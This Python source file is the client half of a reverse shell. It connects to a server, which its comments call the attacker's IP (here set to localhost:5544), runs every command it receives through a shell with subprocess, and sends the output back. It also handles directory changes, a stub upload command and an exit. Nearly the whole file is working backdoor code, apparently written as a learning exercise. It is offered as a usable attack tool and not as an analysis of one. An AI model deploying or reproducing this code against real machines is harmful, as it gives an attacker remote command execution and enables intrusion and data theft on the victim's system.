# 1 - import right module
import os
import socket
import subprocess

# 2 - create UDP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 3 - connect the socket to the port where the server listing (ip of attacker, public ip works)
server_conf = 'localhost', 5544

# 4 - connect socket to server_conf
sock.connect(server_conf)

# 5 - send first message
sock.sendall("Connected".encode("utf-8"))

# 6 - recv message from server
# interpret it as command line
while True:

    rcv_command = sock.recv(2048).decode("utf-8")
    op = subprocess.Popen(rcv_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    output_cmd = op.stdout.read() + op.stderr.read()
    sock.sendall(output_cmd)

    # 7 print rcv_command for test
    # Test block
    print("rcv_command:", rcv_command)
    print("op_pid:", op.pid)
    print("op_wait:", op.wait())  # if op.wait is at 1 thats mean the command is not handle or understand
    print("------------------------")
    # End Of Test Block

    # Go to C:\
    if rcv_command == 'cd /':
        os.chdir("c:/")
        sock.sendall("[*] Change To Directory C:/".encode("utf-8"))

    # Get actual Path
    if rcv_command[:2] == 'cd':
        if os.path.exists(str(rcv_command[3:].replace('\n', ''))):
            os.chdir(str(rcv_command[3:].replace('\n', '')))

    # path downgrade
    #if rcv_command == 'cd..':
        #if os.path.exists(str(rcv_command.replace('\n', ''))):
            #os.chdir(str(rcv_command))


    # Upload file rcv test
    if rcv_command == 'upload':
        os.rename('test2.txt', 'test_sent.txt')
        sock.sendall("[*] Target: File Upload".encode('utf-8'))

    # Exit condition
    if rcv_command == "exit":
        sock.sendall("Exiting...".encode('utf-8'))
        sock.close()





